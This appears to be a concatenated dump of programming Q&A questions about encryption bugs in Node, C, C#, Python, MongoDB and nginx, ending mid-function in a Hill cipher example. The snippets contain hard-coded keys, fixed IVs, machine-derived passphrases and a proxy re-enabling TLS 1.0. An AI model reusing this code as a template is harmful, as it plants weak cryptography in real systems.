<p>Below is my code</p>
<pre><code>const publicKey = `-----BEGIN CERTIFICATE-----
MIIELzCCAxegAwIBAgIIArnMylZGlBgwDQYJKoZIhvcNAQELBQAwaTELMAkGA1UE
BhMCSU4xFDASBgNVBAgMC01haGFyYXNodHJhMQ8wDQYDVQQHDAZNdW1iYWkxDTAL
BgNVBAoMBEF4aXMxETAPBgNVBAsMCEF4aXNCYW5rMREwDwYDVQQDDAhBUElHV0JN
UzAeFw0yMTEwMjYwODQ2MjFaFw0yMzExMTUwODQ2MjFaMGkxCzAJBgNVBAYTAklO
MRQwEgYDVQQIDAtNYWhhcmFzaHRyYTEPMA0GA1UEBwwGTXVtYmFpMQ0wCwYDVQQK
DARBeGlzMREwDwYDVQQLDAhBeGlzQmFuazERMA8GA1UEAwwIQVBJR1dCTVMwggEi
MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDLkALNhDxRPhW3clvfwgf8W2Wq
kWa/Te4Qkpn+jl/By2m6uu6nf6LBDDDfAbS1tzrn7BntQvowk4gY6umBTEOj9kfu
TUneWW9O3Qgao+Qe8IUySd92B4fKLtlsg4ugbkYi6YKz+Ab+cbzOZlR6Y8Yhf+JM
yfNIcj8tErmt3QtTergKtawtwwCr7vkDXSpkxNsmtFWVPBeC8YD9B1/01M7M/8bU
raVK1SD3ZrgCHi4ppEWbJMPuH0cUqhu1GOZFJyT/s5K5/1GsSbWmXzg4Gw3aZJoH
cdombtRH7VA5AWCchpxkLXk/QWKAbfb4XL7PwvgCz7eL6HCz00Jg0Wipjhh3AgMB
AAGjgdowgdcwDAYDVR0TBAUwAwEB/zAdBgNVHQ4EFgQU5JguYg2Bu0pa8zm3/m8C
+gWCKdIwgZoGA1UdIwSBkjCBj4AU5JguYg2Bu0pa8zm3/m8C+gWCKdKhbaRrMGkx
CzAJBgNVBAYTAklOMRQwEgYDVQQIDAtNYWhhcmFzaHRyYTEPMA0GA1UEBwwGTXVt
YmFpMQ0wCwYDVQQKDARBeGlzMREwDwYDVQQLDAhBeGlzQmFuazERMA8GA1UEAwwI
QVBJR1dCTVOCCAK5zMpWRpQYMAsGA1UdDwQEAwICvDANBgkqhkiG9w0BAQsFAAOC
AQEAsWnpwN9Pv7jSqOssAfb0UPqiE3q4J2G1M8HK/bjZEESaNmUX3ugBG5tsFLj9
RIjhxBMqpjzWGTrBhDItFiSecE/bb5a0TuZ3YWENp8MeShfpAkbldxiL2ivYNUL8
NNIXHm1WFRxcrjKsaUVeEJ7/IFP0r6eSX6Sg3HONWdw+yde0D+VJC5NAkjnmVJhd
eZcQXHuRmmwJWpSXvznewRbV+OhDWyY8MOs5RHqOhpi6IEwmFvdRXC4N5gM7eurp
diZWzhJiS5isDSVlx8ogeGLxxY/6wFixGzBS/1a1GMhvkLYylY/81IT7ViyI07QK
HqlxrbngzQkiAA/ydoXzdMEUQQ==
-----END CERTIFICATE-----`;

const rsaEncryption = (incomingData:string): string =&gt; {
    const rsaEncryptedData =  crypto?.publicEncrypt(
        {
            key:        publicKey,
            padding:    crypto.constants.RSA_PKCS1_OAEP_PADDING,
            oaepHash:   &quot;SHA-1&quot;
        },
        Buffer.from(incomingData)
    );

      if(rsaEncryptedData.length &lt; 256) {
        //alert('short payload')
        console.error('xxx rsaEncryptedData length: ', rsaEncryptedData.length)
        console.error('xxx rsaEncryptedData: ', rsaEncryptedData)
        console.error('xxx incomingData: ', incomingData, '\n incomingData length: ', incomingData.length, '\n','\n ====end====')
    } else {
      console.log('success, expected output ', rsaEncryptedData.length)
}

   return { rsaEncryptedData }
}
// End RSA encryption function


///
    const startEncryption =() =&gt; {
        const data= 'CF9FNcUpvrzExofwhFKvxameOQoe8iZz'
        let codition = 256;
        while(codition &gt;= 256){
            const receivedData = rsaEncryption(data);
            codition = receivedData.rsaEncryptedData.length;
            if(codition &lt; 256) {
                alert();
                console.error('xxx receivedData:\n ', receivedData.rsaEncryptedData.length, '\n -----end-')
            }
        }
    }

startEncryption()


</code></pre>
<p>using in nextjs application current node version is v16.20.2</p>
"
"<p>I am trying a simple XOR encryption in C/C++ for Windows. To achieve this I am using a key &quot;SECRETKEY&quot; and a character array &quot;payload&quot;. If at some point the value of current key value is equal to that of the current payload value, then the result is 0x00, therefore terminating the string. What's a common workaround?</p>
<pre><code>const char key[] = &quot;tSECRETKEY&quot;;


void XORCipher(char * payload) {
    
    // Key pointer
    int j = 0;

    int a = sizeof(payload);

    for (int i = 0; i &lt; strlen(payload); i++) {
        *(payload + i) = *(payload + i) ^ key[j];
        j++;

        if (j == sizeof(key))
            j = 0;
    }

}

int main()
{
    char payload[] = &quot;test&quot;;

    XORCipher(payload);
    XORCipher(payload);

    printf(&quot;%s\n&quot;, payload);

    return 0;
}
</code></pre>
<p>Result is empty, as expected.</p>
"
"<p>I've been using the following code to encrypt some password in my application. The original code was listed here <a href=""https://stackoverflow.com/questions/10168240/encrypting-decrypting-a-string-in-c-sharp"">Encrypting &amp; Decrypting a String in C#</a>. And I've updated it to fit the requirements of .NET6.</p>
<p>It was working as expected with Hashing Algorithm SHA1, but the update to .NET 8 required a change to another algorithm e.g. SHA512.</p>
<p>It's still decrypting correctly but only returns the first few characters. Any Hint why this is happening?</p>
<p>The original question is closed, so this is a new one.</p>
<pre class=""lang-cs prettyprint-override""><code>using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;

namespace AesEncryption
{
    /// &lt;summary&gt;
    /// Extension class for encryption based on an algorithm described in https://stackoverflow.com/questions/10168240/encrypting-decrypting-a-string-in-c-sharp
    /// Changed the fixed derivationIterations to a random short-number and algorithm to AesCng.
    /// Changed HashAlgorithm to SHA512, as SHA1 became deprecated
    /// &lt;/summary&gt;
    public static class GlobalEncryptionAes
    {
        public static string Encrypt(this string plainText)
        {
            return Encrypt(plainText, GeneratePassPhrase());
        }

        public static string Encrypt(this string plainText, string passPhrase)
        {
            // DerivationIterations, Salt and IV are randomly generated each time, but is prepended to encrypted cipher text, so they can be used for decryption
            byte[] derivationIterationsBytes = GenerateBitsOfRandomEntropy(2);
            int derivationIterations = (int)BitConverter.ToUInt16(derivationIterationsBytes);
            if (derivationIterations == 0) derivationIterations++;

            byte[] saltStringBytes = GenerateBitsOfRandomEntropy(32);
            byte[] ivStringBytes = GenerateBitsOfRandomEntropy(16);
            byte[] plainTextBytes = Encoding.UTF8.GetBytes(plainText);
            using (Rfc2898DeriveBytes password = new Rfc2898DeriveBytes(passPhrase, saltStringBytes, derivationIterations, HashAlgorithmName.SHA512))
            {
                var keyBytes = password.GetBytes(32);
                using (AesCng symmetricKey = new AesCng())
                {
                    symmetricKey.KeySize = 256;
                    symmetricKey.BlockSize = 128;
                    symmetricKey.Mode = CipherMode.CBC;
                    symmetricKey.Padding = PaddingMode.PKCS7;
                    using (var encryptor = symmetricKey.CreateEncryptor(keyBytes, ivStringBytes))
                    {
                        using (MemoryStream memoryStream = new MemoryStream())
                        {
                            using (CryptoStream cryptoStream = new CryptoStream(memoryStream, encryptor, CryptoStreamMode.Write))
                            {
                                cryptoStream.Write(plainTextBytes, 0, plainTextBytes.Length);
                                cryptoStream.FlushFinalBlock();

                                // Create the final bytes as a concatenation of the random derivation iteration bytes, the random salt bytes, the random iv bytes and the cipher bytes.
                                byte[] cipherTextBytes;
                                cipherTextBytes = derivationIterationsBytes;
                                cipherTextBytes = cipherTextBytes.Concat(saltStringBytes).ToArray();
                                cipherTextBytes = cipherTextBytes.Concat(ivStringBytes).ToArray();
                                cipherTextBytes = cipherTextBytes.Concat(memoryStream.ToArray()).ToArray();
                                memoryStream.Close();
                                cryptoStream.Close();

                                return Convert.ToBase64String(cipherTextBytes);
                            }
                        }
                    }
                }
            }
        }

        /// &lt;summary&gt;
        /// decrypts a string
        /// &lt;/summary&gt;
        /// &lt;param name=&quot;cipherText&quot;&gt;encrypted string&lt;/param&gt;
        /// &lt;returns&gt;&lt;/returns&gt;
        public static string Decrypt(this string cipherText)
        {
            return Decrypt(cipherText, GeneratePassPhrase());
        }

        /// &lt;summary&gt;
        /// decrypts a string
        /// &lt;/summary&gt;
        /// &lt;param name=&quot;cipherText&quot;&gt;encrypted string&lt;/param&gt;
        /// &lt;param name=&quot;passPhrase&quot;&gt;encryption key&lt;/param&gt;
        /// &lt;returns&gt;&lt;/returns&gt;
        public static string Decrypt(this string cipherText, string passPhrase)
        {
            // Get the complete stream of bytes that represent:
            // [2 byte of Derivation Iteration], [32 bytes of Salt] + [16 bytes of IV] + [n bytes of CipherText]
            byte[] cipherTextBytesWithDerivationIterationSaltIv = Convert.FromBase64String(cipherText);

            if (cipherTextBytesWithDerivationIterationSaltIv.Length &lt;= 50)
            {
                throw new ArgumentException(&quot;cipherText is not valid&quot;);
            }

            // Get the DerivationIterationBytes by extracting the first 2 bytes from the supplied cipherText bytes.
            byte[] derivationIterationsBytes = cipherTextBytesWithDerivationIterationSaltIv.Take(2).ToArray();
            int derivationIterations = (int)BitConverter.ToUInt16(derivationIterationsBytes);

            // Get the saltStringBytes by extracting the next 32 bytes from the supplied cipherText bytes.
            byte[] saltStringBytes = cipherTextBytesWithDerivationIterationSaltIv.Skip(2).Take(32).ToArray();

            // Get the ivStringBytes by extracting the next 24 bytes from the supplied cipherText bytes.
            byte[] ivStringBytes = cipherTextBytesWithDerivationIterationSaltIv.Skip(34).Take(16).ToArray();

            // Get the actual cipher text bytes by removing the first 58 bytes (2 + 32 + 16) from the cipherText string.
            byte[] cipherTextBytes = cipherTextBytesWithDerivationIterationSaltIv.Skip(50).Take(cipherTextBytesWithDerivationIterationSaltIv.Length - 50).ToArray();

            using (Rfc2898DeriveBytes password = new Rfc2898DeriveBytes(passPhrase, saltStringBytes, derivationIterations, HashAlgorithmName.SHA512))
            {
                var keyBytes = password.GetBytes(32);
                using (AesCng symmetricKey = new AesCng())
                {
                    symmetricKey.KeySize = 256;
                    symmetricKey.BlockSize = 128;
                    symmetricKey.Mode = CipherMode.CBC;
                    symmetricKey.Padding = PaddingMode.PKCS7;
                    using (var decryptor = symmetricKey.CreateDecryptor(keyBytes, ivStringBytes))
                    {
                        using (MemoryStream memoryStream = new MemoryStream(cipherTextBytes))
                        {
                            using (CryptoStream cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Read))
                            {
                                byte[] plainTextBytes = new byte[cipherTextBytes.Length];
                                var decryptedByteCount = cryptoStream.Read(plainTextBytes, 0, plainTextBytes.Length);
                                memoryStream.Close();
                                cryptoStream.Close();

                                return Encoding.UTF8.GetString(plainTextBytes, 0, decryptedByteCount);
                            }
                        }
                    }
                }
            }
        }

        /// &lt;summary&gt;
        /// generates string dependent on machine name and user name and SID of user
        /// &lt;/summary&gt;
        /// &lt;returns&gt;passphrase&lt;/returns&gt;
        private static string GeneratePassPhrase()
        {
            string machineName;
            string currentUserName;
            SecurityIdentifier? currentUserSecurityIdentifier;
            string currentUserSecurityIdentifierString;
            string passPhrasString;
            byte[] passPhraseBytes;

            machineName = Environment.MachineName;
            currentUserName = WindowsIdentity.GetCurrent().Name;
            currentUserSecurityIdentifier = WindowsIdentity.GetCurrent().User;
            if (currentUserSecurityIdentifier is not null)
            {
                currentUserSecurityIdentifierString = currentUserSecurityIdentifier.Value;
            }
            else
            {
                currentUserSecurityIdentifierString = &quot;&quot;;
            }

            passPhrasString = machineName + currentUserName + currentUserSecurityIdentifierString;
            passPhraseBytes = Encoding.UTF8.GetBytes(passPhrasString);

            return Convert.ToBase64String(passPhraseBytes);
        }

        /// &lt;summary&gt;
        /// generates entropy
        /// &lt;/summary&gt;
        /// &lt;returns&gt;random entropy of length&lt;/returns&gt;
        public static byte[] GenerateBitsOfRandomEntropy(byte numberOfBytes)
        {
            byte[] randomBytes = new byte[numberOfBytes];

            RandomNumberGenerator.Fill(randomBytes);

            return randomBytes;
        }
    }

    public class Program
    {
        static void Main(string[] args)
        {
            string plainText = &quot;abc&quot;;
            Console.WriteLine(plainText);

            string cypherText = plainText.Encrypt();
            Console.WriteLine(cypherText);

            plainText = cypherText.Decrypt();
            Console.WriteLine(plainText);




            plainText = &quot;abcdefghijklmnopqrstuvwxyz&quot;;
            Console.WriteLine(plainText);

            cypherText = plainText.Encrypt();
            Console.WriteLine(cypherText);

            plainText = cypherText.Decrypt();
            Console.WriteLine(plainText);
        }
    }
}
</code></pre>
<p>The above code results in following output:</p>
<p>Short text works as expected</p>
<pre><code>        string plainText = &quot;abc&quot;;
        Console.WriteLine(plainText);

        string cypherText = plainText.Encrypt();
        Console.WriteLine(cypherText);

        plainText = cypherText.Decrypt();
        Console.WriteLine(plainText);
</code></pre>
<p><strong>Output</strong></p>
<pre class=""lang-none prettyprint-override""><code>abc
rsWFdjY34byN8xxMt/pJxXc4s0Nvi/HwZEW9g0KFhAS+qqi+qlTlbHg73WN49HNOxSB4jXPqqev7MucKwyLvUepR
abc
</code></pre>
<p>Longer text is decrypted correctly BUT truncated</p>
<pre><code>        plainText = &quot;abcdefghijklmnopqrstuvwxyz&quot;;
        Console.WriteLine(plainText);

        cypherText = plainText.Encrypt();
        Console.WriteLine(cypherText);

        plainText = cypherText.Decrypt();
        Console.WriteLine(plainText);
</code></pre>
<p><strong>Output</strong></p>
<pre class=""lang-none prettyprint-override""><code>abcdefghijklmnopqrstuvwxyz
xoTpfRH4GIMrB4KrrjWxAy872n3dCAvGZteJCb1W+xfX3jIa9ZFFn94lUhhxwQWaJzh1lAi/B44ZXrYCQK67u3z4BZIelPxEBHfuFeEXKsIJiA==
abcdefghijklmnop
</code></pre>
<p>My expectation would be the same plain text without truncation.
When using the deprecated SHA1 the above code works as expected with the full text, as far as I am aware of.</p>
"
"<p>When an encrypted Collection is created using <strong>clientEncryption.createEncryptedCollection</strong> in Mongodb Atlas, an <strong>&quot;Encrypted Collection A&quot;</strong> is created from scratch following the <strong>&quot;Encrypted Fields Map A&quot;.</strong></p>
<p>I have <strong>&quot;Encypted Collection A&quot;</strong> with <strong>&quot;Encrypted Fields Map A&quot;</strong>. I want to modify several fields ( add encrypted fields, add regular unencrypted fields, remove some fields) inside of &quot;Encrypted Collection A&quot;. How do I update/implement the <strong>&quot;Encrypted Fields Map A&quot;</strong> without having to create an entire new encrypted Collection?</p>
<p>Do I have to create a new Encrypted Collection every time I need to change the encrypted schema of the collection?</p>
"
"<p><strong>NODE Environment</strong></p>
<p>I generate secretKey in nodejs as below,</p>
<pre><code>const generateAesKey = () =&gt; {
    const { randomBytes } = require('node:crypto');

    randomBytes(32, (err, buf) =&gt; {
        if (err) throw err;
        return buf.toString('hex');
    });

}
const secretKey = generateAesKey(); 
</code></pre>
<p>SecretKey looks something like this : <code>491fb9719864f51e19a0705a3ef2de15cd91576d881cdc4bd4394bf7451ee404</code></p>
<p>Using above key, I encrypt and decrypt data as below (<strong>Node</strong> environment)</p>
<pre><code>const CryptoJS = require(&quot;crypto-js&quot;);

// updated per Tppaco's comment
const secretKey = CryptoJS.enc.Hex.parse(&quot;491fb9719864f51e19a0705a3ef2de15cd91576d881cdc4bd4394bf7451ee404&quot;);                                  

const encrypt = (plainText) =&gt; {

    const iv = CryptoJS.enc.Utf8.parse('BBBBBBBBBBBBBBBB');
    const encrypted = CryptoJS.AES.encrypt(plainText, CryptoJS.enc.Utf8.parse(secretKey), {
        iv: iv,
        mode: CryptoJS.mode.CBC,
    });
    return encrypted.toString();

}

const decrypt = (cipherText) =&gt; {
    const iv = CryptoJS.enc.Utf8.parse('BBBBBBBBBBBBBBBB');
    const decrypted = CryptoJS.AES.decrypt(cipherText, CryptoJS.enc.Utf8.parse(secretKey), {
        iv: iv,
        mode: CryptoJS.mode.CBC,
    });
    return CryptoJS.enc.Utf8.stringify(decrypted);
}

const en = encrypt(&quot;Text to be encrypted&quot;);
console.log(decrypt(en))
</code></pre>
<p>I am able to encrypt/decrypt data successfully in <strong>Node</strong> environment.
<strong>The problem</strong> comes when I have to decrypt data in <strong>Python</strong> environment that I encrypted in <strong>Node</strong> environment.</p>
<p><strong>Python Environment</strong></p>
<p>I have written below <strong>Python</strong> code which is equivalent Node code (correct me if this statement is not right).</p>
<pre><code>from Crypto.Cipher import AES
from Crypto.Util.Padding import pad,unpad
import base64
import json
import os
#CBC with Fix IV

# key = os.urandom(32)                                 // to generate random secret key

# updated per Tppaco's comment
key = bytes.fromhex('491fb9719864f51e19a0705a3ef2de15cd91576d881cdc4bd4394bf7451ee404')


data = 'Text to be encrypted'

#FIX IV
iv =  'BBBBBBBBBBBBBBBB'.encode('utf-8') #16 char for AES128

def encrypt(data,key,iv):
        data= pad(data.encode(),16)
        cipher = AES.new(key,AES.MODE_CBC,iv)
        return base64.b64encode(cipher.encrypt(data))

def decrypt(enc,key,iv):
        enc = base64.b64decode(enc)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        return unpad(cipher.decrypt(enc),16)



def lambda_handler(event, context):
    
    encrypted = encrypt(data,key,iv)
    print('encrypted CBC base64 : ',encrypted.decode(&quot;utf-8&quot;, &quot;ignore&quot;))

    decrypted = decrypt(encrypted,key,iv)
    print('decrypted data: ', decrypted.decode(&quot;utf-8&quot;, &quot;ignore&quot;))
    return {
        'statusCode': 200,
        'decrypted text': json.dumps(decrypted.decode(&quot;utf-8&quot;, &quot;ignore&quot;))
    }
</code></pre>
<p><strong>Error</strong></p>
<blockquote>
<p>&quot;errorMessage&quot;: &quot;Padding is incorrect.&quot;,
&quot;errorType&quot;: &quot;ValueError&quot;,</p>
</blockquote>
<p>My main purpose is to encrypt data in <strong>Node</strong> and decrypt it in <strong>Python</strong>. What am I doing wrong ?</p>
<p>Please help. I really need a solution. Been trying to resolve since many days...</p>
"
"<p>I have an application that I'm developing that needs to be able to encrypt a string solely on the front end with a key. I can get the encryption and decryption working in the front end completely fine using CryptoJS. I've used this Gist as an example. <a href=""https://gist.github.com/dudepare/99f4d682c3db90ea86a4331e32f0006a"" rel=""nofollow noreferrer"">https://gist.github.com/dudepare/99f4d682c3db90ea86a4331e32f0006a</a></p>
<p>The complication is that I need to be able to decrypt it on a server running C#. I am currently trying with the following code:</p>
<pre><code>using System.Text;

namespace anApplication
{
    public class DecryptionService : IDecryptionService
    {
        public string DecryptString(string encryptedMessage, string key)
        {
            // Convert the key to bytes
            byte[] keyBytes = Encoding.UTF8.GetBytes(key);

            // Get the IV (first 16 bytes of the encrypted message)
            byte[] iv = Convert.FromBase64String(encryptedMessage).Take(16).ToArray();

            // Get the ciphertext (the rest of the encrypted message)
            byte[] ciphertext = Convert.FromBase64String(encryptedMessage).Skip(16).ToArray();

            // Create an AES decryptor
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = keyBytes;
                aesAlg.IV = iv;

                // Create a decryptor to perform the stream transform
                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);

                // Create the streams used for decryption
                using (MemoryStream msDecrypt = new MemoryStream(ciphertext))
                using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                using (StreamReader srDecrypt = new StreamReader(csDecrypt))
                {
                    // Read the decrypted bytes from the decrypting stream
                    return srDecrypt.ReadToEnd();
                }
            }
        }
    }
}
</code></pre>
<p>I have tried matching up all of the specific values for the IV, padding etc (including specifying the defaults to ensure they are all set correctly) but still cannot come back with the same value from both the front end encryption -&gt; front end decryption and front end encryption -&gt; back end decryption.</p>
<p>My question is not so much how to do it (although if someone has this working and can share that code then I'd happily receive that example and worship that individual as a deity) but more whether it is correct that multiple implementations of the same cryptographic algorithm should produce the same output values and be interchangeable for decryption (given that all of the variables are set the same obviously)?</p>
<p>Bonus points for suggestions on implementations that are compatible in C# and JS if the above answer is that they should be interchangeable and megapoints giveaway for someone who can share a working example of the three methods (JSEncryption, JSDecryption, C#Decryption)</p>
<p>Thanks in advance for any information.</p>
"
"<p>I work for a company that has a legacy app that's using old ciphers on an old OS and one of the modules inside this app is a translation API that connects to api.cognitive.microsofttranslator.com. I've been trying to create a reverse proxy to act as a middleman/reverse proxy between my web server 1 &quot;10.10.10.11&quot; and web server 2 &quot;10.10.10.12&quot; and the Microsoft site as they removed old legacy unsupported ciphers. we are doing our best to update/fix the issue but we need the module to be functional until we fix it. can someone help me with the configuration file?</p>
<p>what i tried is:</p>
<pre><code>server {
    listen 443 ssl;
    server_name api.cognitive.microsofttranslator.com;
    ssl_certificate /etc/nginx/sites-available/ssl/certificate.crt;
    ssl_certificate_key /etc/nginx/sites-available/ssl/private_key_decrypted.pem;
    ssl_protocols TLSv1.2 TLSv1.1 TLSv1;
    ssl_ciphers 'ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA:ECDHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES256-SHA:DHE-RSA-AES128-SHA:ECDHE-RSA-DES-CBC3-SHA:EDH-RSA-DES-CBC3-SHA:AES256-GCM-SHA384:AES128-GCM-SHA256:AES256-SHA256:AES128-SHA256:AES256-SHA:AES128-SHA:DES-CBC3-SHA:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!MD5:!PSK:!RC4';

    location / {
        proxy_pass https://api.cognitive.microsofttranslator.com;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_ssl_server_name on;
        proxy_ssl_protocols TLSv1.2 TLSv1.1 TLSv1;
        proxy_ssl_ciphers 'HIGH:!aNULL:!eNULL:!EXPORT:!DES:!MD5:!PSK:!RC4';
        proxy_ssl_trusted_certificate /etc/nginx/sites-available/ssl/rootCA.crt;
        proxy_ssl_verify on;
    }
}
</code></pre>
<p>those certificates are created using OpenSSL on Ubuntu and installed in the ubuntu server, and I changed the site ip in webserver local host file to point to nginx server.
I appreciate any help you can provide.</p>
<p>the supported ciphers are:
Protocols
TLS 1.3 Yes
TLS 1.2 Yes</p>
<pre><code># TLS 1.3 (suites in server-preferred order)TLS_AES_256_GCM_SHA384 (0x1302) ECDH x25519 (eq. 3072 bits RSA) FS 256TLS_CHACHA20_POLY1305_SHA256 (0x1303) ECDH x25519 (eq. 3072 bits RSA) FS 256TLS_AES_128_GCM_SHA256 (0x1301) ECDH x25519 (eq. 3072 bits RSA) FS 128
</code></pre>
<pre><code># TLS 1.2 (suites in server-preferred order)
TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 (0xc02f) ECDH x25519 (eq. 3072 bits RSA) FS 128
TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (0xc030) ECDH x25519 (eq. 3072 bits RSA) FS 256
TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256 (0xcca8) ECDH x25519 (eq. 3072 bits RSA) FS 256
</code></pre>
"
"<p>I am working on an old project and i am stuck with an error in rijndael encryption. i cant use another encryption.
i am getting BlockSize must be 128 in this implementation error.
i have tried all possible solutions from stackoverflow but nothing worked</p>
<pre><code>internal static string Encrypt(string plainText, string passPhrase)
{
    byte[] array = GetArrayMethod();
    byte[] array2 = GetArrayMethod();
    byte[] bytes = Encoding.UTF8.GetBytes(plainText);
    using Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passPhrase, array, 1000);
    byte[] bytes2 = rfc2898DeriveBytes.GetBytes(32);
    using RijndaelManaged rijndaelManaged = new RijndaelManaged();
    rijndaelManaged.BlockSize = 256;
    rijndaelManaged.Mode = CipherMode.CBC;
    rijndaelManaged.Padding = PaddingMode.PKCS7;
    using ICryptoTransform transform = rijndaelManaged.CreateEncryptor(bytes2, array2);
    using MemoryStream memoryStream = new MemoryStream();
    using CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write);
    cryptoStream.Write(bytes, 0, bytes.Length);
    cryptoStream.FlushFinalBlock();
    byte[] inArray = array.Concat(array2).ToArray().Concat(memoryStream.ToArray())
        .ToArray();
    memoryStream.Close();
    cryptoStream.Close();
    return Convert.ToBase64String(inArray);
}

internal static string Decrypt(string cipherText, string passPhrase)
{
    byte[] array = null;
    try
    {
        array = Convert.FromBase64String(cipherText);
    }
    catch (Exception)
    {
        return string.Empty;
    }
    byte[] salt = array.Take(32).ToArray();
    byte[] rgbIV = array.Skip(32).Take(32).ToArray();
    byte[] array2 = array.Skip(64).Take(array.Length - 64).ToArray();
    using Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passPhrase, salt, 1000);
    byte[] bytes = rfc2898DeriveBytes.GetBytes(32);
    using RijndaelManaged rijndaelManaged = new RijndaelManaged();
    rijndaelManaged.BlockSize = 256;
    rijndaelManaged.Mode = CipherMode.CBC;
    rijndaelManaged.Padding = PaddingMode.PKCS7;
    using ICryptoTransform transform = rijndaelManaged.CreateDecryptor(bytes, rgbIV);
    using MemoryStream memoryStream = new MemoryStream(array2);
    using CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Read);
    byte[] array3 = new byte[array2.Length];
    int count = cryptoStream.Read(array3, 0, array3.Length);
    memoryStream.Close();
    cryptoStream.Close();
    return Encoding.UTF8.GetString(array3, 0, count);
}

private static byte[] GetArrayMethod()
{
    byte[] array = new byte[32];
    using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
    rNGCryptoServiceProvider.GetBytes(array);
    return array;
}
</code></pre>
<p>expecting a solution on how i can solve this error</p>
"
"<p>Need help with this problem regaring encryption / decryption stuff.</p>
<p>I need to encrypt a GUID string and saved it to DB, which then will be decrypted and be used to identify a data.</p>
<p>However, sometimes the encrypted string is able to be decrypted and sometimes don't. it looks like there's something missing in my code:</p>
<pre><code>public string Encrypt(string stringToEncrypt, string sEncryptionKey)
        {
            byte[] key = Encoding.UTF8.GetBytes(sEncryptionKey.PadLeft(32));
            byte[] inputByteArray = Encoding.UTF8.GetBytes(stringToEncrypt);
            byte[] encrypted;

            using (Aes aes = Aes.Create())
            {
                ICryptoTransform encryptor = aes.CreateEncryptor(key, IV);

                using MemoryStream msEncrypt = new();
                using CryptoStream csEncrypt = new(msEncrypt, encryptor, CryptoStreamMode.Write);
                csEncrypt.Write(inputByteArray, 0, inputByteArray.Length);
                csEncrypt.FlushFinalBlock();
                encrypted = msEncrypt.ToArray();
            }

            return HttpUtility.UrlEncode(Convert.ToBase64String(encrypted));
        }

public string Decrypt(string stringToDecrypt, string sEncryptionKey)
        {
            string result = string.Empty;

            byte[] key = Encoding.UTF8.GetBytes(sEncryptionKey.PadLeft(32));
            byte[] inputByteArray = Convert.FromBase64String(HttpUtility.UrlDecode(stringToDecrypt));
            Encoding encoding = Encoding.UTF8;

            using (Aes aes = Aes.Create())
            {
                ICryptoTransform decryptor = aes.CreateDecryptor(key, IV);

                using MemoryStream msDecrypt = new();
                using CryptoStream csDecrypt = new(msDecrypt, decryptor, CryptoStreamMode.Write);
                csDecrypt.Write(inputByteArray, 0, inputByteArray.Length);
                csDecrypt.FlushFinalBlock();
                result = encoding.GetString(msDecrypt.ToArray());
            }

            return result;

        }
</code></pre>
<p>Both function uses the same IV and encryptionKey, and i've tested my code using these encrypted string</p>
<ol>
<li>O900I6c8rXR1s9BrZCSzQxLdu7qLlGwxBNqtDMoMGLKsjDebDC69SgPimW1uMgNj &lt;- not working</li>
<li>YLK5RiCvnKyKxKX3vybSIRxlyccut62Qdg4X%2bPPBwmU6fr%2fKBILsKoY3LGdtHN%2b1 &lt;- working</li>
<li>%2bqX0P5NEg8KxK1h6OTCsDSid0CZv6idKtnrn4FHjK7NvvcCb7LJHsiRtzBlrA79k &lt;- working</li>
</ol>
<p>Somehow only the first one doesn't work despite using the same encryption function. The exception happend on the FlushFinalBlock() line on Decryption Method.</p>
<p>Encryption is done in .NET 6 app</p>
<p>Decryption is done in .NET 4.6.1 app</p>
<p>Here is sample key and IV to test:</p>
<blockquote class=""spoiler"">
<p> key = d4n40nly</p>
</blockquote>
<blockquote class=""spoiler"">
<p> IV = new byte[] { 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, &gt;! 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F };</p>
</blockquote>
<p>Can someone enlighten me on this?</p>
"
"<p>My program periodically saves encrypted data. I use <code>Argon2id</code> to derive the key from a password. When doing so repeatedly one should not reuse the <code>nonce</code> as that's what the word <code>nonce</code> stands for.</p>
<p>However is it safe to reuse the derived key when saving the data after the data has been modified? This somehow seems wrong as it would be the same as generating this key repeatedly by reusing a nonce which one should not do. However, regenerating new keys from the password when saving requires the password to be stored during the entire session and requires a lot of computation.</p>
"
"<p>This is a program that aims to encrypt text by:
turning them into alphabetical order first,
checking if its even or not,
then splitting it into two numbers that represent those alpha in one list to make it possible to multiply by the key matrix to then get the resultant numbers.
The decrypt works by paring them into two items per list
Calculate using multiplication of inverse of the key matrix with the encryped numbers u get from the function above,
Afterwards it convert those numbers back to alphabet via the dictionary
I think this is called hill cypher
The code:</p>
<pre><code>import pyperclip
Alphabet_Dictionary = {chr(i): i - ord('A') + 1 if i &gt;= ord('A') and i &lt;= ord('Z') else i - ord('a') + 1 for i in range(ord('A'), ord('Z') + 1)}

Alphabet_Dictionary[' '] = 27

def text2num(message):
    text2numresult = []
    for letter in message:
        text2numresult.append(Alphabet_Dictionary[letter.upper()])
    return text2numresult
def num2text(numlist):
    num2textresult = &quot;&quot;
    for num in numlist:
        for letter,value in Alphabet_Dictionary.items():
            if num == value:
                num2textresult += letter
    return num2textresult
def splittingNums(messagenum):
